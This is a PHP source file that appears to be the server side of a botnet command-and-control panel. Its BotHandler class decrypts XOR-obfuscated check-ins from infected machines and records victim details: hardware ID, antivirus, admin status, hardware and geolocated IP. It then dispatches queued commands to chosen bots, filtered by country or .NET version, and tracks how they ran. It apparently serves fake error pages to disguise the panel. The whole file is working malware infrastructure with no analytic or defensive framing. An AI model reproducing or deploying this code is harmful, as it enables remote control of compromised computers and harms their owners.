<?php

use GeoIp2\Database\Reader;

class BotHandler
{


    public function xor_this($data)
    {

        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
        $statementConfig->execute(array("1"));
        $config = $statementConfig->fetch();
        $key = $config["enryptionkey"];
        $dataLen = strlen($data);
        $keyLen = strlen($key);
        $output = $data;
        for ($i = 0; $i < $dataLen; ++$i) {
            $output[$i] = $data[$i] ^ $key[$i % $keyLen];
        }
        return $output;
    }


    public function request()
    {
        $GLOBALS["template"][0] = "FakeErrors";
        $GLOBALS["template"][1] = "cloudflare";
        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
        $statementConfig->execute(array("1"));
        $config = $statementConfig->fetch();


        if (!empty($_POST["botversion"])) {
            //Old version
            die();
        }

        //  var_dump($_POST);
        if (!empty($_POST["taskid"])) {
            $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks_completed SET status = ? WHERE taskid = ? AND bothwid LIKE ?"); // AND taskid = ?
            $statement->execute(array($_POST["taskstatus"], $_POST["taskid"], $_POST["hwid"]));
            die("nice");
        }


        //echo $_POST["taskid"];

        //Decrypt Main Requests
        if (!empty($_POST["request"])) {

            $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));

            parse_str($signal, $postbot);

            $botfound = false;
            $bot = "";


            $reader = new Reader(__DIR__ . '/../../Geo/GeoLite2-City.mmdb');

            if (!empty($_SERVER['REMOTE_ADDR'])) {
                $ip = $_SERVER['REMOTE_ADDR'];
                $record = $reader->city($ip);
                $country = $record->country->isoCode;
                $countryName = $record->country->name;
                $countryCity = $record->city->name;
                $countryLatitude = $record->location->latitude;
                $countryLongitude = $record->location->longitude;
            } else {
                $country = "unknow";
                $countryLatitude = "";
                $countryLongitude = "";
                $countryName = "";
            }


            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
            $statement->execute(array($postbot["hwid"]));
            while ($row = $statement->fetch()) {
                $botfound = true;
                $bot = $row;
            }

            if ($botfound) {


                $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?  WHERE hwid = ?");
                $statement->execute(array($ip, $postbot["hwid"]));


                $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
                while ($com = $cmds->fetch(PDO::FETCH_ASSOC)) {
                    if ($com['status'] == "1") {
                        //$executions = $GLOBALS["pdo"]->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
                        $executions_querry = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as executions FROM tasks_completed WHERE taskid = :i");
                        $executions_querry->execute(array(":i" => $com['id']));
                        if($com["execution_limit"] != 0 && $executions_querry->fetchColumn(0) >= $com["execution_limit"]){
                            continue;
                        }
                        $ae = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
                        $ae->execute(array(":i" => $com['id'], ":h" => $postbot["hwid"]));
                        if ($ae->fetchColumn(0) == 0) {
                            //TODO FILTER CHECKING
                            //CHECK if Filter is Empty
                            if (!empty($com["filter"])) {
                                //Check if Filter is none
                                if ($com["filter"] != "[]") {
                                    //Filter to array
                                    $filter = json_decode($com["filter"], true);
                                    if (is_array($filter)) {
                                        // Search Country in Filter if not found die
                                        if (!empty($filter["country"])) {
                                            if (!preg_match('/\b' . $country . '\b/', $filter["country"])) {
                                                continue;
                                            }
                                        }

                                        //Check if Bot Only Ececution
                                        if (!empty($filter["onlybot"])) {
                                            if ($filter["onlybot"] != $bot["id"]) {
                                                continue;
                                            }
                                        }

                                        if (!empty($filter["netFramwork"])) {

                                            $framworkHelper = "";
                                            if ($postbot["netFramework2"] == "true") {
                                                $framworkHelper .= " net2 ";
                                            }

                                            if ($postbot["netFramework3"] == "true") {
                                                $framworkHelper .= " net3 ";
                                            }

                                            if ($postbot["netFramework35"] == "true") {
                                                $framworkHelper .= " net35 ";
                                            }

                                            if ($postbot["netFramework4"] == "true") {
                                                $framworkHelper .= " net4 ";
                                            }

                                            $frameworks = explode(",", $filter["netFramwork"]);
                                            $allow = false;
                                            foreach ($frameworks as $framework) {
                                                if (preg_match('/\b' . trim($framework) . '\b/', $framworkHelper)) {
                                                    $allow = true;
                                                }
                                            }

                                            if (!$allow) {
                                                continue;
                                            }
                                        }
                                    }
                                }
                            }

                            if ($com["task"] == "uninstall") {
                                echo $com["id"] . ";uninstall;uninstall";
                            } else {
                                echo $com["id"] . ";" . $com["task"] . ";" . $com["command"];
                            }
                            //send taskID

                            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks_completed (bothwid, taskid, status) VALUES (?, ?, ?)");
                            $statement->execute(array($postbot["hwid"], $com["id"], "send"));
                            //insert Send
                            // Get Executed or Failed
                            die();
                            break;
                        }
                    }
                }

            } else {
                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                if (!empty($postbot["antivirus"])) {
                    $avcheck = base64_decode($postbot["antivirus"]);
                } else {
                    $avcheck = "none";
                }


                $statement->execute(array(
                    $avcheck,
                    $postbot["hwid"],
                    $postbot["computername"],
                    $country,
                    $postbot["netFramework2"],
                    $postbot["netFramework3"],
                    $postbot["netFramework35"],
                    $postbot["netFramework4"],
                    $countryLatitude,
                    $countryLongitude,
                    $countryName,
                    $postbot["installedRam"],
                    base64_decode($postbot["gpuName"]),
                    base64_decode($postbot["cpuName"]),
                    $postbot["aornot"],
                    base64_decode($postbot["arch"]),
                    $ip,
                    base64_decode($postbot["operingsystem"]),
                    $postbot["botversion"]
                ));
            }
            echo "waiting";
            die();
        }


        die();


    }


}
